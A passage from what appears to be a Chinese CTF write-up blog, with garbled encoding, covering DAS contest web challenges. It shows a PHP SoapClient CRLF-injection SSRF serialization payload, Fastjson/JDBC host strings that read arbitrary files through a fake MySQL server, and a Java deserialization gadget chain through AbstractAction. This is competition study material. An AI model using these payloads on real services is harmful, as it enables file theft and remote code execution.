\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n--0f9486e921f5468f9ab50745c4c93267--\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/siranai.php&quot;</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;shanghe\r\n&quot;</span> . <span class="string">&quot;Cookie: PHPSESSION=16aaab9fb\r\nContent-Type: multipart/form-data; boundary=&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$postdata</span>,<span class="number">2</span>,<span class="number">32</span>).<span class="string">&quot;\r\nConnection: keep-alive\r\nAccept: */*\r\nContent-Length: 10416&quot;</span>.<span class="string">&quot;\r\n\r\n&quot;</span>.<span class="variable">$postdata</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/siranai.php&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (SoapFault <span class="variable">$e</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;koi=[<span class="string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;[<span class="variable">$a</span>,<span class="string">&quot;nnnnn&quot;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><p>è¿™nmçœŸæŠ½è±¡,ğŸ‘´æå‡ºæ¥,è‡ªå·±éƒ½ç»·ä¸ä½äº†.</p><p>ä½†æ˜¯ğŸ‘´æ‰“è¿›å»,æ–‡ä»¶è¢«æ›¿æ¢,é‚£ç§ç»ˆå‡ºçš„æ„Ÿè§‰,çœŸâˆšâ‘§çˆ½!!!1</p><h1 id="ezfastjson"><span id="ezfastjson"> Ezfastjson</span></h1><p>shanhegiegieå‡ºçš„é»‘ç›’(å¤§æ¦‚)java,åˆšå¥½å†…å®¹æ˜¯æˆ‘å­¦è¿‡çš„,æˆ‘å¯å¤ªå–œæ¬¢äº†ğŸ¥°ğŸ¥°ğŸ¥µ</p><p>æœ¬åœ°èµ·ä¸ª<a href="https://github.com/fnmsd/MySQL_Fake_Server">msql_fake_server</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;host&quot;</span>:<span class="string">&quot;vps:3307/test?user=fileread_netdoc:///&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>è¯»å•¥æ–‡ä»¶éƒ½è¡Œ,é™¤äº†flag,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;host&quot;</span>:<span class="string">&quot;vps:3307/test?user=fileread_netdoc:///app/ezfastjson-0.0.1-SNAPSHOT.jar&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>æºç é‰´èµä¸€æ³¢<img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1701412058276.png" alt="1701412058276"></p><p><s>ä½ â›°ğŸgiegieè„‘æŠ½äº†</s></p><p>æŠŠwafå†™åœ¨äº†parseObjectä¹‹å,é‚£ä¸ç›´æ¥æ‰“å®Œååºåˆ—åŒ–æ¼æ´å†æ£€æµ‹å—,è·Ÿæ²¡æœ‰ä¸€æ ·.</p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥æ‰“JNDI,ä¸è¿‡è¿™ä¸æ˜¯é‡ç‚¹,é‡ç‚¹æ˜¯é¢„æœŸè§£,é¢„æœŸè§£çš„é“¾å­æ¯”è¾ƒæœ‰æ„æ€.</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1701412219014.png" alt="1701412219014"></p><p>è¿™æ˜¯é»‘åå•,åŸºæœ¬ä¸Šæ˜¯æŠŠreadobjectåˆ°tostringç»™banäº†.</p><p>ä¸è¿‡è¿˜æœ‰æœ€ç»ˆæ­¦å™¨,ğŸ‘´é©¬ä¸Šå°±æå‡ºæ¥ç»™ä½ çœ‹çœ‹!!!</p><p>å°±æ˜¯NEEPUCTFä¸­Nomapçš„é‚£æ¡é“¾.</p><h2 id="nomap"><span id="nomap"> Nomap</span></h2><p>è°ƒç”¨é“¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javax.swing.AbstractAction<span class="comment">#readObject -&gt; </span></span><br><span class="line">javax.swing.AbstractAction<span class="comment">#putValue -&gt;</span></span><br><span class="line">javax.swing.AbstractAction<span class="comment">#firePropertyChange -&gt; </span></span><br><span class="line">java.lang.Object<span class="comment">#equals</span></span><br></pre></td></tr></table></figure><p>è¿™beyondÃ·ç©æ„éœ€è¦é‡å†™writeObject,é‚£ä¹ˆæ”¹writeObjectæ–¹æ³•æ¯”è¾ƒå¤š,ä½†æ˜¯javassistè²Œä¼¼ç”¨ä¸äº†,éœ€è¦ä½¿ç”¨agentå»ä¿®æ”¹.</p><p>è°éƒ½æ²¡æœ‰æƒ³åˆ°,æˆ‘ä»¬è‡³å°Šçš„å¤§Bè€å¸ˆä½¿ç”¨æœ¬åœ°é‡æ–°å†™ä¸ªä¸€æ¨¡ä¸€æ ·çš„ç±»å»ä¿®æ”¹,yahari,é«˜ç«¯çš„æ–¹æ³•å¾€å¾€åªéœ€è¦æœ´ç´ çš„æ“ä½œ.ğŸ¤£</p><p>çœ‹çœ‹<code>javax.swing.AbstractAction#readObject</code></p><h3 id="å‚è€ƒæ–‡çŒ®"><span id="å‚è€ƒæ–‡çŒ®"> å‚è€ƒæ–‡çŒ®ğŸ˜Š</span></h3><p><a href="https://aecous.github.io/2023/04/24/%E4%B8%80%E6%9D%A1%E6%8A%BD%E8%B1%A1%E7%9A%84equals%E8%A7%A6%E5%8F%91%E9%93%BE/">ä¸€æ¡æŠ½è±¡çš„equalsè§¦å‘é“¾ | Prove yourself (aecous.github.io)</a></p><p>[NeepuCTF2023 å…¬å¼€èµ› Writeup - Boogiepop Doesnâ€™t Laugh (<a href="http://boogipop.com">boogipop.com</a>)](<a href="https://boogipop.com/2023/05/21/NeepuCTF2023">https://boogipop.com/2023/05/21/NeepuCTF2023</a> å…¬å¼€èµ› Writeup/)</p><p>ğŸ‘´æ¥çœ‹çœ‹æ€ä¹ˆä¸ªäº‹</p><h3 id="è°ƒç”¨é“¾"><span id="è°ƒç”¨é“¾"> è°ƒç”¨é“¾</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javax.swing.AbstractAction<span class="comment">#readObject -&gt; </span></span><br><span class="line">javax.swing.AbstractAction<span class="comment">#putValue -&gt;</span></span><br><span class="line">javax.swing.AbstractAction<span class="comment">#firePropertyChange -&gt; </span></span><br><span class="line">java.lang.Object<span class="comment">#equals</span></span><br></pre></td></tr></table></figure><p>è¿™beyondÃ·ç©æ„éœ€è¦é‡å†™writeObject,é‚£ä¹ˆæ”¹writeObjectæ–¹æ³•æ¯”è¾ƒå¤š,ä½†æ˜¯javassistè²Œä¼¼ç”¨ä¸äº†,éœ€è¦ä½¿ç”¨agentå»ä¿®æ”¹.</p><p>è°éƒ½æ²¡æœ‰æƒ³åˆ°,æˆ‘ä»¬è‡³å°Šçš„å¤§Bè€å¸ˆä½¿ç”¨æœ¬åœ°é‡æ–°å†™ä¸ªä¸€æ¨¡ä¸€æ ·çš„ç±»å»ä¿®æ”¹,yahari,é«˜ç«¯çš„æ–¹æ³•å¾€å¾€åªéœ€è¦æœ´ç´ çš„æ“ä½œ.ğŸ¤£</p><p>çœ‹çœ‹<code>javax.swing.AbstractAction#readObject</code></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699834640583.png" alt="1699834640583"></p><p>å†çœ‹çœ‹<code>javax.swing.AbstractAction#putValue</code></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699834775607.png" alt="1699834775607"></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699834876739.png" alt="1699834876739"></p><p>è§¦å‘equals,equalså¯ä»¥è§¦å‘Xstringçš„equalsä»è€Œè°ƒç”¨ä»»æ„getters.</p><p>ç”±äºæ˜¯æŠ½è±¡ç±»,éœ€è¦æ‰¾åˆ°å…¶å­ç±»</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699835790399.png" alt="1699835790399"></p><p>é€‰æ‹©AlignmentAction.</p><h3 id="writeobject"><span id="writeobject"> writeObject</span></h3><p><code>AlignmentAction</code>åœ¨è¿›è¡Œæ„é€ å‡½æ•°è°ƒç”¨çš„æ—¶å€™,ä¼šä¸æ–­å‘ä¸Šå»è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699836526844.png" alt="1699836526844"></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699836549771.png" alt="1699836549771"></p><p>Action.NAMEä¸ºå›ºå®šçš„Nameï¼Œnameä¸ºæˆ‘ä»¬çš„ç¬¬ä¸€å‚æ•°</p><p>è·Ÿè¿›<code>putValue</code></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699837756147.png" alt="1699837756147"></p><p>åˆ›å»ºäº†<code>arrayTable</code>,æŠŠNameå’Œvalueæ”¾å…¥.</p><p>ä½¿ç”¨<code>alignmentAction.putValue</code>ï¼Œå°†æ¶æ„é”®å€¼ä¹Ÿæ·»åŠ è¿›<code>arrayTable</code>ä¸­.</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699838216914.png" alt="1699838216914"></p><p>éšå<code>writeObject</code>å†™å…¥åºåˆ—åŒ–æµ</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699838409618.png" alt="1699838409618"></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699838392444.png" alt="1699838392444"></p><p>å°†é”®å€¼å¯¹ä¸€æ¬¡æŒ‰é˜Ÿå†™å…¥</p><p>readObject</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699842844409.png" alt="1699842844409"></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699842901393.png" alt="1699842901393"></p><p>ä¼šè¯»å–é”®å€¼å¯¹,ç„¶åå’Œä¹‹å‰ä¸€æ ·,åˆ›å»ºä¸€ä¸ªæ–°çš„<code>ArrayTable</code>å¹¶ä¸”æ”¾å…¥é”®å€¼å¯¹.</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699844037396.png" alt="1699844037396"></p><p>ä½†æ˜¯å¦‚æœä¸€å¯¹é”®å€¼å¯¹çš„keyä¹‹å‰å·²ç»å­˜å…¥äº†è¯¥key,é‚£ä¹ˆå°±ä¼šå°†è¯¥å€¼èµ‹å€¼ç»™oldValue,ç„¶åè°ƒç”¨<code>firePropertyChange</code>.</p><p>è¿™é‡Œè®©<code>oldValue</code>ä¸º<code>Xstring</code>,<code>newValue</code>ä¸º<code>jsonnodes</code>å³å¯.</p><p>è¦å®Œæˆè¿™ä¸ªæ­¥éª¤,éœ€è¦è®©<code>jsonnodes</code>çš„keyå’Œ<code>Xstring</code>çš„keyä¸€è‡´.</p><p>å¯¹æ­¤Aecousä½¬ç»™å‡ºçš„æ–¹æ³•ç®€å•ç²—æš´,ç›´æ¥ç”¨010æ”¹æ–‡ä»¶çš„åºåˆ—åŒ–æ•°æ®</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699844191063.png" alt="1699844191063"></p><p>å¤§Bè€å¸ˆé‡å†™wtireArrayTableæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> 